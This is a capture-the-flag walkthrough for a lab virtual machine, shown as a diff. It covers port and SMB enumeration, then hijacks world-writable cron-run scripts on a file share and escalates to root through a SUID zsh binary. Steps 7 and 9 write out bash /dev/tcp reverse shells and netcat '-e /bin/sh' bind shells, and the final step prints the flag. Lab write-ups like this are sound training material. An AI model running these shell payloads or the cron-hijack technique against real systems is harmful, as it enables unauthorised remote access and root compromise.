@@ -1,0 +1,112 @@
+[*]
+1. find host: sql 172.16.16.33
+MAC Address: 08:00:27:FE:E4:B4 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.33
+Host is up (0.0024s latency).
+MAC Address: 08:00:27:CE:45:B5 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+Host is up.
+[*]
+2. scan host: nmap 172.16.16.33
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+[*]
+3. Service version scan: nmap 172.16.16.33 -sV -p 80,139,445,3306
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
+[*]
+4. SMB enumeration: enum4linux 172.16.16.33
+Network shares
+print$          Disk      Printer Drivers
+ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
+IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+
+
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\dawn (Local User)
+S-1-22-1-1001 Unix User\ganimedes (Local User)
+[+] Enumerating users using SID S-1-5-21-4292367078-475864837-953252120 and logon username '', password ''
+
+PASSWORD POLICY
+[+] Minimum password length: 5
+[+] Password history length: None
+[+] Maximum password age: 37 days 6 hours 21 minutes 
+[+] Password Complexity Flags: 000000
+
+[+] Domain Refuse Password Change: 0
+[+] Domain Password Store Cleartext: 0
+[+] Domain Password Lockout Admins: 0
+[+] Domain Password No Clear Change: 0
+[+] Domain Password No Anon Change: 0
++] Domain Password Complex: 0
+
+
+[*]
+5. http enumeration: nikto -h 172.16.16.33 && dirb http://172.16.16.33/ -a linux
+---- Scanning URL: http://172.16.16.33/ ----
++ http://172.16.16.33/index.html (CODE:200|SIZE:791)                                                                                                                                   
+==> DIRECTORY: http://172.16.16.33/logs/                                                                                                                                               
++ http://172.16.16.33/server-status (CODE:403|SIZE:300)                                                                                                                                
+                                                                      
++ Target Port:        80
++ Start Time:         2019-12-31 08:43:42 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 317, size: 58f2eb81ffb49, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3268: /logs/: Directory indexing found.
++ OSVDB-3092: /logs/: This might be interesting...
+[*]
+6. Check /logs: Got 403 on everything except management.log
+2020/01/01 03:30:04 CMD: UID=0    PID=645    | /usr/sbin/CRON -f 
+2020/01/01 03:30:04 CMD: UID=0    PID=647    | chmod 777 /home/dawn/ITDEPT/product-control 
+2020/01/01 03:30:04 CMD: UID=0    PID=648    | /usr/sbin/CRON -f 
+2020/01/01 03:30:04 CMD: UID=0    PID=649    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control 
+[*]
+7. Put & listen for shell
+echo 'bash -i >& /dev/tcp/172.16.16.33/4444 0>&1' > product-control
+echo 'bash -i >& /dev/tcp/172.16.16.33/80 0>&1' > web-control
+nc -nvlp 4444
+[*]
+8. No shell?
+1/01 03:44:01 CMD: UID=33   PID=957    | /bin/sh -c /home/dawn/ITDEPT/web-control 
+2020/01/01 03:44:01 CMD: UID=1000 PID=959    | /bin/sh -c /home/dawn/ITDEPT/product-control 
+2020/01/01 03:44:03 CMD: UID=0    PID=961    | /bin/sh -c run-parts --report /etc/cron.monthly 
+2020/01/01 03:44:03 CMD: UID=0    PID=962    | /bin/sh -c run-parts --report /etc/cron.monthly 
+2020/01/01 03:44:03 CMD: UID=0    PID=963    | run-parts --report /etc/cron.monthly 
+2020/01/01 03:44:03 CMD: UID=0    PID=964    | /bin/sh /etc/cron.monthly/0anacron 
+
+[*]
+9. New shell
+echo 'nc -nvlp 443 -e /bin/sh &' > web-control
+echo 'nc -nvlp 4444 -e /bin/sh &' > product-control
+[*]
+10. Uploaded unix-priv-checker.sh, and found SUID binary
+
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 861568 Feb  4  2019 /usr/bin/zsh
+[*]
+11. Run /usr/bin/zsh:
+whoami
+root
+[*]
+12. Get flag:
+cd /root
+cat flag.txt
+
+Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!
+
+flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
+
+[*]
